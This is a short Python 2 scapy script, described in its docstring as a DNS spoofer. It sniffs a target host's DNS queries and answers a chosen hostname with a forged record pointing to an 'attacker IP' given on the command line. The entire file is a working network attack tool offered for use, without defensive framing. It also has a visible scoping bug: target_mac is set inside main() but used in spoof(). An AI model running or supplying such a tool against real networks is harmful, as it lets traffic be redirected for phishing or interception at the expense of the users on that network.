#!/usr/bin/python

"""

    - Perform a DNS spoof for a particular host

"""

from scapy.all import *
import sys
import uuid

def get_local_mac():
    local_mac = str(format(uuid.getnode(), 'x'))

    while len(local_mac) < 12:
        local_mac = "0" + local_mac

    mac_bytes = []
    separator = ":"
    start = 0
    end = 2

    while end <= len(local_mac):
        mac_bytes.append(local_mac[start:end])
        start += 2
        end +=2

    local_mac = separator.join(mac_bytes)

    return local_mac

def spoof(packet):
    if packet.haslayer(DNS) and packet[IP].src == sys.argv[1]:
        request = packet[DNS][DNSQR].qname

        if request == "%s." % (sys.argv[2]):
            fake_response = Ether(src=get_local_mac(), dst=target_mac)/IP(src=packet[IP].dst, dst=packet[IP].src)/UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)/DNS(id=packet[DNS].id, qr=1, qd=DNSQR(qname="%s." % (sys.argv[2])), an=DNSRR(rrname="%s." % (sys.argv[2]), rdata=sys.argv[3]))

            sendp(fake_response)
        else:
            print request[:len(request)-1]


def main():
    if len(sys.argv) == 4:
        conf.verb = 0
        arp_pck = sr1(ARP(pdst=sys.argv[1]))
        target_mac = arp_pck.hwsrc

        try:
            sniff(filter="udp port 53 and ip host %s" % (sys.argv[1]), prn=spoof, store=0)
        except KeyboardInterrupt:
            print ""
    else:
        print "DNSspoofer.py [target IP] [host to spoof] [attacker IP]"

main()
